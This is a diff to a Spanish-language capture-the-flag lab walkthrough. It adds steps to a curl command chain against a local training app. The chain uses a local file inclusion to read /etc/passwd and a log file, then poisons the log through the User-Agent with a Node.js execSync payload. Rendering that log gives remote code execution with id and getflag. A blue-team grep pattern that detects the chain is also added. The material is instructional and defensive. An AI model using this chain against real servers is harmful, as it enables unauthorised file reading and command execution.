@@ -88,14 +88,27 @@ La guía marca **Obtén la flag y envíala** y muestra "🎉 ¡Flag válida!".
 ## Resumen de la cadena (una sola corrida con curl)
 ```bash
 HOST="http://localhost"; SALA="demo"
-# 2) LFI
-curl -s "$HOST/?room=$SALA&page=/etc/passwd" | grep root:x:0:0
+# 2) LFI (lectura cruda con raw=1)
+curl -s "$HOST/?room=$SALA&page=/etc/passwd&raw=1" | grep root:x:0:0
+# 3) leer el log en crudo (ves tu User-Agent)
+curl -s "$HOST/?room=$SALA&page=/var/log/lab/$SALA.log&raw=1" | tail -3
 # 4) envenenar el log
 curl -s -A '${require("child_process").execSync(cmd).toString()}' "$HOST/?room=$SALA" >/dev/null
-# 5) RCE
+# 5) RCE (render del log + comando)
 curl -s "$HOST/?room=$SALA&page=/var/log/lab/$SALA.log&cmd=id" | grep -o 'uid=[0-9]*([a-z]*)'
 # 6) flag
 curl -s "$HOST/?room=$SALA&page=/var/log/lab/$SALA.log&cmd=getflag%20$SALA" | grep -o 'FLAG{[^}]*}'
+```
+
+> **Novedades de la app:** el visor admite `&raw=1` (lectura cruda sin evaluar) para
+> inspeccionar archivos y el log sin disparar el payload; sin `raw` lo renderiza (SSTI). Hay
+> un `.env` señuelo y el código es legible por LFI (recon), pero el secreto real vive en el
+> binario `getflag` (no legible). La pista del log está escondida en la sección **Soporte TI**.
+
+### Equipo azul
+Todas las peticiones quedan en `/var/log/lab/access.log` (incluidos 404). Caza la cadena:
+```bash
+docker compose exec web grep -Ei "\.\./|/etc/passwd|\$\{|require\(|child_process|execSync" /var/log/lab/*.log
 ```
 
 ## Por qué funciona (conceptos a reforzar)
